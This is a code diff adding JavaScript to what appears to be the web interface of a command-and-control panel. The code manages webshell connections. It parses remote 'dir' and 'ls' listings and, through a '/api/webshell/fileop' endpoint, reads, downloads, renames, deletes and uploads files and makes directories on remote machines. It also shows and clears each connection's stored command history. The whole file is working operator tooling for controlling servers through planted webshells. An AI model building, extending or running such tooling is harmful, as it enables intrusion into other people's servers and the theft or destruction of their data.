+        html += '<tr><td>' + icon + '</td><td class="mono" style="word-break:break-all;">' + name + '</td><td class="mono">' + escapeHtml(size) + '</td><td class="mono" style="color:var(--text-muted);">' + escapeHtml(e.mtime || '') + '</td><td>' + op + '</td></tr>';
+    }
+    html += '</tbody></table>';
+    box.innerHTML = html;
+}
+
+function wsParseList(output) {
+    const lines = output.split('\n').map(function(s) { return s.trim(); }).filter(Boolean);
+    const entries = [];
+    // dir 输出头部(卷标/目录标题)不匹配日期格式;扫描任一数据行判断 win/linux
+    const isWin = lines.some(function(l) { return /^\d{4}\/\d{2}\/\d{2}\s+\d{2}:\d{2}/.test(l); });
+    if (isWin) {
+        // dir: 2026/08/16  10:00  <DIR>          name   /  2026/08/16  10:00            12345 name
+        for (const line of lines) {
+            // <DIR> 目录行:无大小字段
+            const dirM = /^(\d{4}\/\d{2}\/\d{2})\s+(\d{2}:\d{2})\s+<DIR>\s+(.+)$/.exec(line);
+            if (dirM) {
+                const nm = dirM[3].trim();
+                if (nm === '.' || nm === '..') continue;
+                entries.push({
+                    name: nm, isDir: true, isLink: false, size: null,
+                    mtime: dirM[1] + ' ' + dirM[2],
+                    fullPath: wsJoinPath(wsCwd, nm)
+                });
+                continue;
+            }
+            const fileM = /^(\d{4}\/\d{2}\/\d{2})\s+(\d{2}:\d{2})\s+([\d,]+)\s+(.+)$/.exec(line);
+            if (!fileM) continue;
+            const nm = fileM[4].trim();
+            if (nm === '.' || nm === '..') continue;
+            entries.push({
+                name: nm, isDir: false, isLink: false,
+                size: parseInt(fileM[3].replace(/,/g, ''), 10) || 0,
+                mtime: fileM[1] + ' ' + fileM[2],
+                fullPath: wsJoinPath(wsCwd, nm)
+            });
+        }
+        return entries;
+    }
+    // ls -la: drwxr-xr-x 2 user group 4096 Aug 16 10:00 name
+    for (const line of lines) {
+        const m = /^([d\-l])([rwxst\-]{9})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+(\w{3}\s+\d{1,2}\s+[\d:]+)\s+(.+)$/.exec(line);
+        if (!m) continue;
+        const type = m[1];
+        let name = m[5].replace(/\/$/, '');
+        // 符号链接 "link -> /target":只取链接名,去掉箭头指向
+        if (type === 'l') name = name.split(' -> ')[0].trim();
+        if (name === '.' || name === '..') continue;   // 过滤 . 与 ..
+        entries.push({
+            name: name, isDir: type === 'd', isLink: type === 'l',
+            size: parseInt(m[3], 10) || 0, mtime: m[4],
+            fullPath: wsJoinPath(wsCwd, name)
+        });
+    }
+    return entries;
+}
+
+function wsFileUp() {
+    const parent = wsDirname(wsCwd);
+    wsFileList(parent);
+}
+
+function wsFileRead(path) {
+    const content = prompt('读取 ' + path + ' 到输出区?路径确认:', path) || path;
+    wsFileOp('read', content);
+    wsSwitchSub('term');
+}
+
+function wsFileDownload(path, name) {
+    const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: 'read', path: path, timeout: wsTimeout()})})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (!data.exec_ok) { alert('下载失败: ' + (data.error || '无输出')); return; }
+            const blob = new Blob([data.output], {type: 'application/octet-stream'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = name || 'file';
+            a.click();
+            URL.revokeObjectURL(a.href);
+        })
+        .catch(function(e) { alert('下载失败: ' + e.message); });
+}
+
+function wsFileRename(path) {
+    const target = prompt('重命名 ' + path + ' → 新路径:', path) || '';
+    if (!target || target === path) return;
+    const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: 'rename', path: path, target_path: target, timeout: wsTimeout()})})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 重命名 ' + path + ' → ' + target + (data.exec_ok ? '' : ' [!] ' + (data.error || '失败')), data.exec_ok ? '' : 'terr');
+            wsAppendOutput(data.output || '(无输出)');
+            wsFileRefresh();
+        });
+}
+
+function wsFileDelete(path) {
+    if (!confirm('确认删除 ' + path + ' ?')) return;
+    const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: 'delete', path: path, timeout: wsTimeout()})})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 删除 ' + path + (data.exec_ok ? '' : ' [!] ' + (data.error || '失败')), data.exec_ok ? '' : 'terr');
+            wsAppendOutput(data.output || '(无输出)');
+            wsFileRefresh();
+        });
+}
+
+function wsUploadFile() {
+    if (!currentWsId) { alert('请先选择连接'); return; }
+    const path = prompt('上传到路径(含文件名):', wsJoinPath(wsCwd, 'upload.bin')) || '';
+    if (!path) return;
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.onchange = function() {
+        const f = input.files[0];
+        if (!f) return;
+        if (f.size > 3 * 1024 * 1024) { alert('文件超过 3MB，请拆分上传'); return; }
+        const reader = new FileReader();
+        reader.onload = function() {
+            // 二进制安全:读为 base64,后端检测 FS3B64: 前缀直接写
+            const b64 = reader.result.split(',')[1];
+            wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 上传 ' + f.name + ' (' + f.size + 'B) → ' + path, 'tok');
+            const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({conn_id: currentWsId, action: 'write', path: path, content: 'FS3B64:' + b64, timeout: wsTimeout()})})
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 上传结果: ' + (data.exec_ok ? '✓ 完成' : '✗ ' + (data.error || '失败')), data.exec_ok ? 'tok' : 'terr');
+                    wsAppendOutput(data.output || '(无输出)');
+                    wsFileRefresh();
+                })
+                .catch(function(e) { wsAppendOutput('上传失败: ' + e.message, 'terr'); });
+        };
+        reader.readAsDataURL(f);
+    };
+    input.click();
+}
+
+function wsFileOp(action, path) {
+    const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: action, path: path, timeout: wsTimeout()})})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 文件[' + action + '] ' + path + (data.exec_ok ? '' : ' [!] ' + (data.error || '失败')), data.exec_ok ? '' : 'terr');
+            wsAppendOutput(data.output || '(无输出)');
+        });
+}
+
+function wsFileOpPrompt(action) {
+    const path = prompt('路径:', wsCwd === '.' ? '/' : wsCwd) || '';
+    if (!path) return;
+    if (action === 'mkdir') {
+        const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({conn_id: currentWsId, action: 'mkdir', path: path, timeout: wsTimeout()})})
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 建目录 ' + path + (data.exec_ok ? '' : ' [!] ' + (data.error || '失败')), data.exec_ok ? '' : 'terr');
+                wsAppendOutput(data.output || '(无输出)');
+                wsFileRefresh();
+            });
+    } else {
+        wsFileOp(action, path);
+    }
+}
+
+// ── 执行历史(Redis 持久化) ──
+async function loadWsHistory() {
+    if (!currentWsId) return;
+    const box = document.getElementById('ws-history');
+    try {
+        const resp = await fetch('/api/webshell/history/' + currentWsId);
+        const data = await resp.json();
+        const hist = data.history || [];
+        if (!hist.length) {
+            box.innerHTML = '<div class="empty-state" style="padding:20px;">暂无执行历史</div>';
+            return;
+        }
+        let html = '';
+        for (const h of hist) {
+            const okCls = h.ok ? 'var(--success)' : 'var(--danger)';
+            html += '<div class="list-item" style="margin-bottom:6px;padding:8px 10px;border:1px solid var(--border);border-radius:var(--radius-sm);">' +
+                    '<div class="li-title" style="display:flex;gap:8px;align-items:center;">' +
+                    '<span class="mono" style="color:' + okCls + ';">' + (h.ok ? '✓' : '✗') + '</span>' +
+                    '<span class="mono" style="font-size:0.8rem;">' + escapeHtml(h.command) + '</span>' +
+                    '<span class="help-text" style="margin-left:auto;font-size:0.7rem;">' + escapeHtml(h.ts_iso || '') + ' · ' + h.ms + 'ms</span></div>' +
+                    (h.error ? '<div class="mono" style="color:var(--danger);font-size:0.75rem;margin-top:2px;">' + escapeHtml(h.error) + '</div>' : '') +
+                    '<div class="mono ws-hist-out" style="font-size:0.72rem;color:var(--text-muted);margin-top:2px;white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:hidden;">' + escapeHtml((h.output || '').slice(0, 300)) + '</div>' +
+                    '</div>';
+        }
+        box.innerHTML = html;
+    } catch (e) { box.innerHTML = '<div class="flash error">加载历史失败</div>'; }
+}
+
+async function clearWsHistoryAll() {
+    if (!currentWsId) return;
+    if (!confirm('清空该连接的全部执行历史？')) return;
+    await fetch('/api/webshell/history/' + currentWsId, {method: 'DELETE'});
+    loadWsHistory();
+}
+
+// ── 初始化 ──
+renderSnippets();
+{% if tab == 'c2' %}loadStatus();{% else %}loadWsConnections();{% endif %}
+</script>
+{% endblock %}
